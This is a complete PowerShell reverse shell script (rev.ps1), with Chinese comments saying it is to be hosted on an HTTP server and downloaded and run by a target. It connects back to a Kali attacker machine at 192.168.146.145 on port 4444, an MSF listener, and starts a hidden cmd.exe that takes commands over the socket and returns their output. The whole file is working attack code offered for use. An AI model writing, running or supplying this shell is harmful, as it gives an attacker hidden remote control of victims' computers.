# rev.ps1 - PowerShell Reverse Shell
# 供 HTTP 服务器托管，被目标下载执行

$ip = "192.168.146.145"  # Kali 攻击机 IP
$port = 4444              # MSF 监听端口

$c = New-Object System.Net.Sockets.TCPClient($ip, $port)
$s = $c.GetStream()
$sr = New-Object System.IO.StreamReader($s)
$sw = New-Object System.IO.StreamWriter($s)
$sw.AutoFlush = $true

$si = New-Object System.Diagnostics.ProcessStartInfo("cmd.exe")
$si.RedirectStandardOutput = $true
$si.RedirectStandardInput = $true
$si.UseShellExecute = $false
$si.CreateNoWindow = $true
$p = [System.Diagnostics.Process]::Start($si)

$buf = New-Object System.Byte[] 65536

while ($c.Connected) {
    if ($s.DataAvailable) {
        $i = $s.Read($buf, 0, $buf.Length)
        $cmd = [Text.Encoding]::ASCII.GetString($buf, 0, $i)
        $p.StandardInput.WriteLine($cmd)
        Start-Sleep -Milliseconds 200
        $out = $p.StandardOutput.ReadToEnd()
        $sw.Write($out)
    }
    Start-Sleep -Milliseconds 100
}

$p.Kill()
$c.Close()
